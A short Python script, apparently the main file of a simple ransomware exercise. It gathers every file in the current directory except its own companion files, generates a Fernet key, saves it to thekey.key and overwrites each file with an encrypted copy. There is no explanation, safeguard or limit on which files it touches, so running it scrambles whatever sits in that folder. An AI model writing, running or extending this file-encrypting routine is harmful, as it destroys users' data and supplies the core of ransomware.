from cryptography import fernet
import os

image_list = list()
for item in os.listdir():
    if os.path.isfile(item):
        image_list.append(item)

to_encrypt = list()
for image in image_list:
    if image == 'main.py' or image == 'decrypt.py' or image == 'thekey.key':
        continue
    else:
        to_encrypt.append(image)


print(image_list)
print(to_encrypt)
key = fernet.Fernet.generate_key()

with open("thekey.key", 'wb') as thekey:
    thekey.write(key)

for file in to_encrypt:
    with open(file, 'rb')as encrypting:
        contents = encrypting.read()
    
    encrypted = fernet.Fernet(key).encrypt(contents)

    with open(file, 'wb') as just_encrypting:
        just_encrypting.write(encrypted)